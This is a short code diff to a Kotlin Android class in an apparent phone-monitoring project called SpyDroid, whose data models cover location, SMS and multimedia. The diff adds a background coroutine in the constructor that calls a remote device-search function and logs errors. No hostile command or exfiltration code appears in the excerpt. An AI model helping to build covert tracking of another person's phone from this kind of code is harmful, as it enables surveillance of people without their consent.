@@ -21,18 +21,33 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.content.SharedPreferences
 import android.net.Uri
+import android.util.Log
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
+import kotlinx.coroutines.launch
 import net.spydroid.common.local.data.KEYS_PM
 import net.spydroid.common.local.data.GLOBAL_STATES_PERMISSIONS
 import net.spydroid.common.local.models.CurrentLocation
 import net.spydroid.common.local.models.CurrentMultimedia
 import net.spydroid.common.local.models.CurrentSms
 import net.spydroid.common.local.models.PERMISSIONS_STATES
+import net.spydroid.common.remote.data.searchDevices
 
 class LocalDataProvider private constructor(
     private val context: Context
 ) {
+
+    init {
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                searchDevices()
+            } catch (e: Exception){
+                Log.e("PRUEBA_KTOR", "Error: ${e.message}")
+            }
+        }
+    }
 
     private val sharedPreferences: SharedPreferences =
         context.getSharedPreferences("SpyDroidPrefs", Context.MODE_PRIVATE)
